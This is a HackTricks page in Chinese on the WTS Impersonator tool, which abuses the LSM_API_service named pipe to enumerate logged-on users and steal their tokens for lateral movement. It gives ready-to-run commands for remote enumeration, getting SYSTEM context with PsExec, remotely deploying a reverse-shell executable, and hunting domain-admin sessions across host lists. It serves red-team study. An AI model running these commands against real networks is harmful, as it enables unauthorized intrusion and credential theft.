<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家，使用</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS红队专家）</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果您想看到您的**公司在HackTricks中被广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我的**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

**WTS Impersonator**工具利用**"\\pipe\LSM_API_service"** RPC命名管道，秘密枚举已登录用户并劫持其令牌，绕过传统的令牌模拟技术。这种方法有助于在网络中实现无缝的横向移动。这项技术背后的创新归功于**Omri Baso**，他的工作可在[GitHub](https://github.com/OmriBaso/WTSImpersonator)上找到。

### 核心功能
该工具通过一系列API调用运行：
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### 关键模块和用法
- **枚举用户**：使用该工具可以进行本地和远程用户枚举，使用以下命令执行相应场景：
- 本地：
```powershell
.\WTSImpersonator.exe -m enum
```
- 远程，通过指定IP地址或主机名：
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **执行命令**：`exec` 和 `exec-remote` 模块需要**服务**上下文才能运行。本地执行只需WTSImpersonator可执行文件和一个命令：
- 本地命令执行示例：
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- 可使用PsExec64.exe获取服务上下文：
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **远程命令执行**：涉及远程创建和安装类似于PsExec.exe的服务，允许以适当权限执行。
- 远程执行示例：
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **用户搜索模块**：针对多台机器上的特定用户，以其凭据执行代码。这对于针对在多个系统上具有本地管理员权限的域管理员非常有用。
- 用法示例：
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
